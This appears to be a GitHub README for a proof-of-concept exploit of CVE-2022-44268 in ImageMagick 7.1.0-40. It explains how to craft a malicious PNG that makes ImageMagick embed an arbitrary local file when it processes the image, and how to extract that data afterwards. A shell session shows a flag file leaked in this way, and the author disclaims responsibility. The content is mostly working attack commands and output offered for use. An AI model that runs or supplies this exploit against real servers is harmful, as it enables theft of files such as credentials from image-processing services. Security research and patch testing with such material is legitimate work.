# CVE-2022-44268

**Credit to the researchers who discovered this:**
- [Bryan Gonzalez and the Ocelot Team](https://www.metabaseq.com/imagemagick-zero-days/)

Create a malicious PNG to take advantage of ImageMagick 7.1.0-40:
- CVE-2022-44267: Denial of Service
- CVE-2022-44268: Information Disclosure

*Disclaimer: The author of this project is not responsible for any possible harm caused by the materials of this project.*

## Requirements
- Python3
- PIL (`pip install Pillow`)

## Usage
Crafting a PNG with **craft.py**:
```shell
git clone https://github.com/agathanon/cve-2022-44268
cd cve-2022-44268
python3 craft.py original.png lol.png /path/to/file
```

Data extraction with **extract.py**:
```shell
python3 extract.py exfil.png
```

## PoC
```shell
anon@computer:~/code/cve-2022-44268$ python3 craft.py original.png readflag.png $PWD/flag.txt 
anon@computer:~/code/cve-2022-44268$ convert readflag.png -resize 100x100 exfil.png
anon@computer:~/code/cve-2022-44268$ python3 extract.py exfil.png
AAAABBBBCCCC

anon@computer:~/code/cve-2022-44268$ 
```
